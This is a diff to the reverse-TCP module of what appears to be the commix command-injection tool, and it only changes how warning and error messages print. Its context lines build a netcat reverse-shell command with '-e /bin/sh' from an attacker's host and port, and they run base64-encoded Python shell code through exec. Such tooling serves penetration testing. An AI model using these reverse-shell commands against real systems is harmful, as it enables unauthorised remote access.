@@ -56,7 +56,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
       nc_alternative = NETCAT_ALTERNATIVES[2]
       break
     elif nc_version.lower() == "reverse_tcp": 
-      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
+      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
       continue
     elif nc_version.lower() == "?": 
       menu.shell_options()
@@ -64,7 +64,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_netcat""" + Style.RESET_AL
     elif nc_version.lower() in settings.SHELL_OPTIONS:
       return nc_version
     else:  
-      print Back.RED + "(x) Error: The '" + nc_version + "' option, is not valid." + Style.RESET_ALL
+      print Back.RED + settings.ERROR_SIGN + "The '" + nc_version + "' option, is not valid." + Style.RESET_ALL
       continue
 
   cmd = nc_alternative + " " + lhost + " " + lport + " -e /bin/sh"
@@ -159,12 +159,12 @@ exec(d,{'s':s})"""
         other_shell = "python -c \"exec('" +other_shell+ "'.decode('base64'))\""
       break
     elif other_shell.lower() == "reverse_tcp": 
-      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
+      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
       continue
     elif other_shell.lower() in settings.SHELL_OPTIONS:
       return other_shell
     else:  
-      print Back.RED + "(x) Error: The '" + other_shell + "' option, is not valid." + Style.RESET_ALL
+      print Back.RED + settings.ERROR_SIGN + "The '" + other_shell + "' option, is not valid." + Style.RESET_ALL
       continue
 
   return other_shell
@@ -190,7 +190,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """
       reverse_tcp_option = other_reverse_shells(lhost, lport)
       break
     elif reverse_tcp_option.lower() == "reverse_tcp": 
-      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
+      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL 
       continue
     elif reverse_tcp_option.lower() == "?": 
       menu.shell_options()
@@ -198,7 +198,7 @@ commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp""" + Style.RESET_ALL + """
     elif reverse_tcp_option.lower() in settings.SHELL_OPTIONS:
       return reverse_tcp_option
     else:
-      print Back.RED + "(x) Error: The '" + reverse_tcp_option + "' option, is not valid." + Style.RESET_ALL
+      print Back.RED + settings.ERROR_SIGN + "The '" + reverse_tcp_option + "' option, is not valid." + Style.RESET_ALL
       continue
 
   return reverse_tcp_option
@@ -211,7 +211,7 @@ def configure_reverse_tcp():
   while True:
     lhost = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_lhost""" + Style.RESET_ALL + """) > """)
     if lhost.lower() == "reverse_tcp": 
-      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL + "\n"
+      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL + "\n"
       continue
     elif lhost.lower() == "?": 
       menu.shell_options()
@@ -224,14 +224,14 @@ def configure_reverse_tcp():
       if len(parts) == 4 and all(part.isdigit() for part in parts) and all(0 <= int(part) <= 255 for part in parts):
         break
       else:	
-        print Back.RED + "(x) Error: The IP format is not valid." + Style.RESET_ALL
+        print Back.RED + settings.ERROR_SIGN + "The IP format is not valid." + Style.RESET_ALL
         continue
 
   # Set up LPORT for The reverse TCP connection
   while True:
     lport = raw_input("""commix(""" + Style.BRIGHT + Fore.RED + """reverse_tcp_lport""" + Style.RESET_ALL + """) > """)
     if lport.lower() == "reverse_tcp": 
-      print Fore.YELLOW + "(^) Warning: You are already into the 'reverse_tcp' mode." + Style.RESET_ALL + "\n"
+      print Fore.YELLOW + settings.WARNING_SIGN + "You are already into the 'reverse_tcp' mode." + Style.RESET_ALL + "\n"
       continue
     elif lport.lower() == "?": 
       menu.shell_options()
@@ -244,7 +244,7 @@ def configure_reverse_tcp():
         if float(lport):
           break
       except ValueError:
-        print Back.RED + "(x) Error: The port must be numeric." + Style.RESET_ALL 
+        print Back.RED + settings.ERROR_SIGN + "The port must be numeric." + Style.RESET_ALL 
         continue
   
   return lhost, lport
